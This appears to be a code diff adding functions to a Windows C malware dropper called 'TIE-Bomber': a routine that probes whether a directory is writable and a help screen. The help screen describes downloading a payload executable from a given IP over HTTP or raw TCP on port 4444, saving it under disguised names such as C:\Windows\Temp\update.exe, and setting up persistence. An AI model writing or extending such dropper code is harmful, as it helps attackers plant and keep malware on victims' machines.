@@ -3,6 +3,8 @@
 
 #include <windows.h>
 #include <stdlib.h>
+#include <shlwapi.h>
+#include <lmcons.h>
 
 #define MAX_URL 2048
 #define MAX_FILE 255
@@ -145,6 +147,59 @@ BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
     }
     
     return rc;
+}
+
+int HasWriteAccess(char *dirPath, void *data) {
+    (void) data;
+
+    char testPath[MAX_PATH + 1];
+    if (dirPath[strlen(dirPath) - 1] != '\\') {
+        dirPath[strlen(dirPath)] = '\\';
+    }
+    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
+    
+    wchar_t wTestPath[MAX_PATH + 1];
+    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);
+
+    HANDLE hFile = CreateFileW(
+        wTestPath,
+        FILE_WRITE_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return WIN_ERROR;
+    }
+
+    CloseHandle(hFile);
+    return SUCCESS;
+}
+
+VOID PrintHelp() {
+    printf("Usage:\n");
+    printf("  TIE-Bomber.exe -i <IP> -e <EXE> [options]\n\n");
+
+    printf("Required arguments:\n");
+    printf("  -i <IP>             IP address of the server to download the payload from.\n");
+    printf("  -e <EXE>            Name of the executable to download (e.g., payload.exe).\n\n");
+
+    printf("Optional arguments:\n");
+    printf("  -t <TARGET PATH>    Full path where the payload should be saved.\n");
+    printf("                      If omitted, name will not be changed.\n");
+    printf("  -p <PORT>           Port number to connect to (default: 4444).\n");
+    printf("  -s                  Use raw TCP sockets instead of HTTP or other protocols.\n");
+    printf("  -P                  Enable persistence only (no download or connect).\n");
+    printf("                      Note: when using -P, the -t option (target path) is required.\n\n");
+    printf("  -h                  print this help message\n\n");
+
+    printf("Examples:\n");
+    printf("  dropper.exe -i 192.168.1.100 -e payload.exe -t C:\\Users\\Public\\drop.exe\n");
+    printf("  dropper.exe -i 10.0.0.2 -e malware.exe -p 9001 -s\n");
+    printf("  dropper.exe -P -t C:\\Windows\\Temp\\update.exe\n\n");
 }
 
 BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data, BOOL allowDefault) {
